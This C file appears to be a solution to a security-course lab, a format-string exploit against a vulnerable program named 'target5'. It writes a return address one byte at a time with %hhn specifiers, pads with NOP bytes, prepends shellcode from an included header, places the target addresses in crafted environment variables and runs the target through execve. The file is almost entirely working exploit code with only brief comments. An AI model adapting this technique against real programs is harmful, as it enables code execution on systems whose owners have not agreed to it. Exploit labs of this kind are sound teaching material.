#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
    char *args[3];
    char *env[42];

    // Return address to overwrite
    char *addr = "\xa8\xfe\xa4\x40";   // 0x40a4fea8
    char *addr_1 = "\xa9\xfe\xa4\x40"; // 0x40a4fea9
    char *addr_2 = "\xaa\xfe\xa4\x40"; // 0x40a4feaa
    char *addr_3 = "\xab\xfe\xa4\x40"; // 0x40a4feab

    // Define the format string
    char format_string[125] = "%8x%8x%5x%hhn%100x%hhn%20x%hhn%67x%hhn";
    int i;
    while (strlen(format_string) < 124) {
        strcat(format_string, "\x90");
    }

    // Concat the format string with the shellcode to remove the '\0' of shellcode
    char final_string[170] = "";
    strcat(final_string, shellcode);
    strcat(final_string, format_string);

    // Pass all attack strings to args and envs
    args[0] = TARGET; 
    // Reorder the address to minimize the size of attack buffer
    args[1] = addr_3; 
    args[2] = NULL;
    
    for (i = 0; i < 11; ++i) {
        env[i] = "\0";
    }
    env[11] = addr_2;
    for (i = 12; i < 23; ++i) {
        env[i] = "\0";
    }
    env[23] = addr;
    for (i = 24; i < 35; ++i) {
        env[i] = "\0";
    }
    env[35] = addr_1;
    for (i = 36; i < 39; ++i) {
        env[i] = "\0";
    }
    env[39] = final_string;
    env[40] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
